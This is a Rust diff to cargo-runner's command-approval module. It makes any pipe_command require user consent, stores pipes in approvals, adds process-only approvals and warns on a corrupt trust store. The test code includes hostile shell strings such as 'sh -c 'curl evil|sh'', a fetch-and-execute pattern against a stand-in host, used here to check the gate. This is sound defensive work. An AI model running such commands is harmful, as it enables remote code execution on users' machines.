@@ -20,6 +20,7 @@ use serde::{Deserialize, Serialize};
 use std::{
     collections::{BTreeMap, HashMap},
     path::{Path, PathBuf},
+    sync::{Mutex, OnceLock},
 };
 
 /// Programs cargo-runner's own builders and built-in plugins can emit.
@@ -96,12 +97,21 @@ pub fn flagged_env(env: &HashMap<String, String>) -> BTreeMap<String, String> {
     out
 }
 
-/// Decide whether `program` + `env` can run without asking.
+/// Decide whether a resolved command can run without asking.
 ///
 /// A program given as an absolute or relative *path* is never auto-allowed
 /// even if its file name matches a known tool: `./cargo` in the repository is
 /// not the `cargo` on PATH.
-pub fn evaluate(program: &str, env: &HashMap<String, String>) -> Verdict {
+///
+/// `pipe` is the command's `pipe_command`, and its presence alone requires
+/// consent no matter how ordinary the program looks. When a pipe is set, the
+/// rustc path stops using argv and builds a `sh -c` string instead, splicing in
+/// the executable path, exec args, the test filter and test-binary args
+/// **unquoted** alongside the pipe itself. So the pipe does not merely add one
+/// shell command — it turns the whole invocation into shell source, and the
+/// test filter is derived from names in the repository's own code. Without a
+/// pipe that same path passes every value through `.arg()` and is safe.
+pub fn evaluate(program: &str, env: &HashMap<String, String>, pipe: Option<&str>) -> Verdict {
     let mut reasons = Vec::new();
 
     let looks_like_path = program.contains('/') || program.contains('\\');
@@ -114,6 +124,12 @@ pub fn evaluate(program: &str, env: &HashMap<String, String>) -> Verdict {
     } else if !known {
         reasons.push(format!(
             "runs `{program}`, which is not one of the build tools cargo-runner knows"
+        ));
+    }
+
+    if let Some(pipe) = pipe.map(str::trim).filter(|p| !p.is_empty()) {
+        reasons.push(format!(
+            "pipes output through `{pipe}`, which runs as a shell command"
         ));
     }
 
@@ -143,6 +159,10 @@ pub struct Approval {
     pub program: String,
     #[serde(default)]
     pub env: BTreeMap<String, String>,
+    /// Recorded so approving one pipe does not bless a different one.
+    /// `default` keeps stores written before this field parseable.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub pipe: Option<String>,
 }
 
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
@@ -183,7 +203,19 @@ impl TrustStore {
         let Ok(text) = std::fs::read_to_string(&path) else {
             return Self::default();
         };
-        serde_json::from_str(&text).unwrap_or_default()
+        match serde_json::from_str(&text) {
+            Ok(store) => store,
+            Err(e) => {
+                // Failing closed is right — every decision gets asked again —
+                // but a corrupt store should not be silently indistinguishable
+                // from an empty one.
+                tracing::warn!(
+                    "ignoring unreadable trust store {}: {e}; approvals will be requested again",
+                    path.display()
+                );
+                Self::default()
+            }
+        }
     }
 
     pub fn contains(&self, approval: &Approval) -> bool {
@@ -216,20 +248,63 @@ pub fn approval_for(
     working_dir: Option<&Path>,
     program: &str,
     env: &HashMap<String, String>,
+    pipe: Option<&str>,
 ) -> Approval {
+    // Fall back to the current directory rather than a sentinel: commands built
+    // by the rustc path carry no working_dir, and a shared placeholder would
+    // make one approval apply in every project instead of just this one.
     let root = working_dir
+        .map(Path::to_path_buf)
+        .or_else(|| std::env::current_dir().ok())
         .map(|d| {
-            std::fs::canonicalize(d)
-                .unwrap_or_else(|_| d.to_path_buf())
+            std::fs::canonicalize(&d)
+                .unwrap_or(d)
                 .to_string_lossy()
                 .into_owned()
         })
-        .unwrap_or_else(|| "<no-working-dir>".to_string());
+        .unwrap_or_else(|| "<unknown-project>".to_string());
     Approval {
         root,
         program: program.to_string(),
         env: flagged_env(env),
+        pipe: pipe
+            .map(str::trim)
+            .filter(|p| !p.is_empty())
+            .map(str::to_string),
     }
+}
+
+/// Approvals granted for this process only, never written to disk.
+///
+/// Backs the "allow once" answer. Keeping it here rather than having the CLI
+/// set an environment variable means a single yes stays scoped to the exact
+/// command it was given for, instead of becoming a blanket bypass for every
+/// later command in the process.
+static SESSION_APPROVALS: OnceLock<Mutex<Vec<Approval>>> = OnceLock::new();
+
+fn session_approvals() -> &'static Mutex<Vec<Approval>> {
+    SESSION_APPROVALS.get_or_init(|| Mutex::new(Vec::new()))
+}
+
+/// Allow `approval` for the remainder of this process without persisting it.
+pub fn allow_for_process(approval: Approval) {
+    // A poisoned lock would mean another thread panicked mid-update; recover
+    // the guard rather than propagate, since failing here would deny a command
+    // the user already approved.
+    let mut guard = session_approvals()
+        .lock()
+        .unwrap_or_else(|e| e.into_inner());
+    if !guard.contains(&approval) {
+        guard.push(approval);
+    }
+}
+
+/// True when `approval` was granted earlier in this process.
+pub fn approved_in_process(approval: &Approval) -> bool {
+    session_approvals()
+        .lock()
+        .map(|g| g.contains(approval))
+        .unwrap_or(false)
 }
 
 /// True when the process was told to skip the prompt for this run.
@@ -258,7 +333,7 @@ mod tests {
     fn known_tools_run_without_consent() {
         for program in ["cargo", "rustc", "bazel", "dx", "cargo.exe", "trunk"] {
             assert_eq!(
-                evaluate(program, &HashMap::new()),
+                evaluate(program, &HashMap::new(), None),
                 Verdict::Allowed,
                 "{program} should be allowed"
             );
@@ -266,8 +341,81 @@ mod tests {
     }
 
     #[test]
+    fn a_pipe_needs_consent_even_for_an_allowlisted_program() {
+        // The rustc path switches to `sh -c` when a pipe is set, so "rustc"
+        // being allowlisted is not enough on its own.
+        let Verdict::NeedsConsent(reasons) =
+            evaluate("rustc", &HashMap::new(), Some("sh -c 'id'"))
+        else {
+            panic!("a pipe must require consent");
+        };
+        assert!(
+            reasons.iter().any(|r| r.contains("sh -c 'id'")),
+            "reason should name the pipe: {reasons:?}"
+        );
+    }
+
+    #[test]
+    fn an_empty_pipe_is_not_a_pipe() {
+        assert_eq!(evaluate("rustc", &HashMap::new(), Some("")), Verdict::Allowed);
+        assert_eq!(
+            evaluate("rustc", &HashMap::new(), Some("   ")),
+            Verdict::Allowed
+        );
+    }
+
+    #[test]
+    fn approving_one_pipe_does_not_bless_another() {
+        let mut store = TrustStore::default();
+        let approved = approval_for(Some(Path::new("/tmp")), "rustc", &HashMap::new(), Some("less"));
+        store.insert(approved.clone());
+
+        assert!(store.contains(&approved));
+        let swapped = approval_for(
+            Some(Path::new("/tmp")),
+            "rustc",
+            &HashMap::new(),
+            Some("sh -c 'curl evil|sh'"),
+        );
+        assert!(
+            !store.contains(&swapped),
+            "a different pipe must not reuse the approval"
+        );
+    }
+
+    #[test]
+    fn process_approvals_satisfy_the_gate_without_touching_disk() {
+        let approval = approval_for(
+            Some(Path::new("/tmp/process-scope")),
+            "some-tool",
+            &HashMap::new(),
+            None,
+        );
+        assert!(!approved_in_process(&approval));
+        allow_for_process(approval.clone());
+        assert!(approved_in_process(&approval));
+
+        // Scoped to that exact command — a different one is still unapproved.
+        let other = approval_for(
+            Some(Path::new("/tmp/process-scope")),
+            "another-tool",
+            &HashMap::new(),
+            None,
+        );
+        assert!(!approved_in_process(&other));
+    }
+
+    #[test]
+    fn stores_written_before_the_pipe_field_still_parse() {
+        let legacy = r#"{"version":1,"approvals":[{"root":"/tmp","program":"dx","env":{}}]}"#;
+        let store: TrustStore = serde_json::from_str(legacy).unwrap();
+        assert_eq!(store.approvals.len(), 1);
+        assert_eq!(store.approvals[0].pipe, None);
+    }
+
+    #[test]
     fn unknown_program_needs_consent() {
-        let Verdict::NeedsConsent(reasons) = evaluate("evil-tool", &HashMap::new()) else {
+        let Verdict::NeedsConsent(reasons) = evaluate("evil-tool", &HashMap::new(), None) else {
             panic!("expected consent to be required");
         };
         assert!(reasons[0].contains("evil-tool"));
@@ -278,7 +426,7 @@ mod tests {
         // A repo-local `./cargo` is not the cargo on PATH.
         for program in ["./cargo", "/bin/sh", "../evil", "sub/dir/cargo"] {
             assert!(
-                matches!(evaluate(program, &HashMap::new()), Verdict::NeedsConsent(_)),
+                matches!(evaluate(program, &HashMap::new(), None), Verdict::NeedsConsent(_)),
                 "{program} should require consent"
             );
         }
@@ -287,7 +435,7 @@ mod tests {
     #[test]
     fn dangerous_env_needs_consent_even_for_cargo() {
         let env = env_of(&[("RUSTC_WRAPPER", "./evil")]);
-        let Verdict::NeedsConsent(reasons) = evaluate("cargo", &env) else {
+        let Verdict::NeedsConsent(reasons) = evaluate("cargo", &env, None) else {
             panic!("expected consent to be required");
         };
         assert!(reasons.iter().any(|r| r.contains("RUSTC_WRAPPER")));
@@ -296,7 +444,7 @@ mod tests {
     #[test]
     fn ordinary_env_is_ignored() {
         let env = env_of(&[("RUST_LOG", "debug"), ("MY_APP_PORT", "8080")]);
-        assert_eq!(evaluate("cargo", &env), Verdict::Allowed);
+        assert_eq!(evaluate("cargo", &env, None), Verdict::Allowed);
     }
 
     #[test]
@@ -304,7 +452,7 @@ mod tests {
         for key in DANGEROUS_ENV {
             let env = env_of(&[(key, "x")]);
             assert!(
-                matches!(evaluate("cargo", &env), Verdict::NeedsConsent(_)),
+                matches!(evaluate("cargo", &env, None), Verdict::NeedsConsent(_)),
                 "{key} should require consent"
             );
         }
@@ -314,18 +462,18 @@ mod tests {
     fn store_round_trips_and_matches_exactly() {
         let mut store = TrustStore::default();
         let env = env_of(&[("RUSTC_WRAPPER", "./w")]);
-        let approval = approval_for(Some(Path::new("/tmp")), "dx", &env);
+        let approval = approval_for(Some(Path::new("/tmp")), "dx", &env, None);
 
         assert!(!store.contains(&approval));
         store.insert(approval.clone());
         assert!(store.contains(&approval));
 
         // A different env value is a different decision.
-        let other = approval_for(Some(Path::new("/tmp")), "dx", &env_of(&[("RUSTC_WRAPPER", "./other")]));
+        let other = approval_for(Some(Path::new("/tmp")), "dx", &env_of(&[("RUSTC_WRAPPER", "./other")]), None);
         assert!(!store.contains(&other));
 
         // Same tuple in another project is also a separate decision.
-        let elsewhere = approval_for(Some(Path::new("/")), "dx", &env);
+        let elsewhere = approval_for(Some(Path::new("/")), "dx", &env, None);
         assert!(!store.contains(&elsewhere));
 
         let text = serde_json::to_string(&store).unwrap();
@@ -336,7 +484,7 @@ mod tests {
     #[test]
     fn inserting_twice_does_not_duplicate() {
         let mut store = TrustStore::default();
-        let approval = approval_for(Some(Path::new("/tmp")), "dx", &HashMap::new());
+        let approval = approval_for(Some(Path::new("/tmp")), "dx", &HashMap::new(), None);
         store.insert(approval.clone());
         store.insert(approval);
         assert_eq!(store.approvals.len(), 1);
